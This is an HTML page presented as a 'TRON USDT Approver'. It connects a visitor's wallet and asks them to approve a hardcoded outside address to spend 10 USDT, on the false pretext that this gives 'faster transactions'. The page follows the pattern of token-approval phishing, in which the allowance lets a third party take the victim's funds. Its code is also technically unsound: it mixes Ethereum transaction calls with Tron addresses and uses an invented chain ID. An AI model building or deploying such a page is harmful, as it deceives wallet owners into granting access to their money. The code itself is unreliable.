<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON USDT Approver</title>
    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.14.0/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@1.2.4/dist/tronwallet-adapter.min.js"></script>
    <style>
        body { font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; max-width: 400px; margin: 0 auto; padding: 20px; text-align: center; }
        button { background: #0070f3; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; margin: 10px 0; }
        button:hover { background: #0056cc; }
        button:disabled { background: #ccc; cursor: not-allowed; }
        .status { margin: 20px 0; padding: 15px; border-radius: 8px; }
        .connected { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .address { word-break: break-all; font-family: monospace; background: #f8f9fa; padding: 10px; border-radius: 4px; margin: 10px 0; }
        #qr-container { display: none; margin: 20px 0; }
    </style>
</head>
<body>
    <h1>🔗 Connect TRON Wallet</h1>
    <p>Approve 10 USDT spending for faster transactions</p>
    
    <button id="connectBtn">Connect Wallet</button>
    <div id="qr-container">
        <p>Scan QR with Trust Wallet</p>
        <div id="qr-code"></div>
    </div>
    
    <div id="status"></div>
    <div id="walletInfo" style="display: none;">
        <div class="address" id="address"></div>
        <button id="approveBtn" disabled>Approve 10 USDT</button>
    </div>

    <script>
        const PROJECT_ID = '171db6da15a54effc1b4a06f889a3c3f'; // Replace with your actual project ID
        const SPENDER = 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV';
        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRC20 USDT mainnet
        const APPROVE_AMOUNT = '10000000'; // 10 USDT (6 decimals)
        const TRON_RPC = 'https://api.trongrid.io';

        let provider = null;
        let walletAdapter = null;

        const showStatus = (message, type = 'info') => {
            const statusEl = document.getElementById('status');
            statusEl.textContent = message;
            statusEl.className = `status ${type}`;
        };

        const connectWallet = async () => {
            try {
                showStatus('Connecting...', 'info');
                
                // Initialize WalletConnect EthereumProvider (works for Tron)
                provider = await window.WalletConnectEthereumProvider.init({
                    projectId: PROJECT_ID,
                    chains: [1], // Fallback chain
                    showQrModal: false,
                    metadata: {
                        name: "USDT Approver",
                        description: "Approve 10 USDT for faster txns",
                        url: window.location.origin,
                        icons: [window.location.origin + '/icon.png']
                    }
                });

                // Also init TronWalletAdapter for native Tron wallets
                walletAdapter = await window.TronLink.init();
                
                // Enable provider
                await provider.enable();
                const accounts = provider.accounts;
                
                if (accounts.length > 0) {
                    const address = accounts[0];
                    document.getElementById('address').textContent = `${address.slice(0,8)}...${address.slice(-8)}`;
                    document.getElementById('walletInfo').style.display = 'block';
                    document.getElementById('connectBtn').style.display = 'none';
                    showStatus('Wallet connected successfully!', 'connected');
                    document.getElementById('approveBtn').disabled = false;
                }
            } catch (error) {
                console.error(error);
                showStatus('Connection failed. Try scanning QR or use TronLink.', 'error');
                // Show QR fallback
                showQR();
            }
        };

        const showQR = async () => {
            const qrContainer = document.getElementById('qr-container');
            qrContainer.style.display = 'block';
            
            // Generate QR for WalletConnect session (simplified)
            // In production, use a proper QR library like qrcode.js
            const qrEl = document.getElementById('qr-code');
            qrEl.innerHTML = `📱 Open Trust Wallet Browser<br/>Enter: ${window.location.href}`;
        };

        const approveUSDT = async () => {
            try {
                document.getElementById('approveBtn').disabled = true;
                showStatus('Requesting approval...', 'info');

                // Prepare TRC20 approve transaction
                const approveData = {
                    to: USDT_CONTRACT,
                    data: `0x095ea7b3000000000000000000000000${SPENDER.slice(2).toLowerCase().padStart(64, '0')}${APPROVE_AMOUNT.padStart(64, '0')}`
                };

                // Send via WalletConnect provider
                const txHash = await provider.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: provider.accounts[0],
                        ...approveData,
                        chainId: '0x2b6653' // Tron mainnet chain ID (2,796,383)
                    }]
                });

                showStatus(`✅ Approval sent! Tx: ${txHash.slice(0,20)}... View on <a href="https://tronscan.org/#/transaction/${txHash}" target="_blank">TronScan</a>`, 'connected');
                
            } catch (error) {
                console.error(error);
                showStatus('Approval failed: ' + error.message, 'error');
                document.getElementById('approveBtn').disabled = false;
            }
        };

        // Event listeners
        document.getElementById('connectBtn').addEventListener('click', connectWallet);
        document.getElementById('approveBtn').addEventListener('click', approveUSDT);

        // Auto-detect TronLink/TronWallet
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            showStatus('TronLink detected! Click connect.', 'connected');
        }

        // Handle provider events
        if (provider) {
            provider.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    showStatus('Wallet disconnected');
                    document.getElementById('walletInfo').style.display = 'none';
                }
            });
        }
    </script>
</body>
</html>
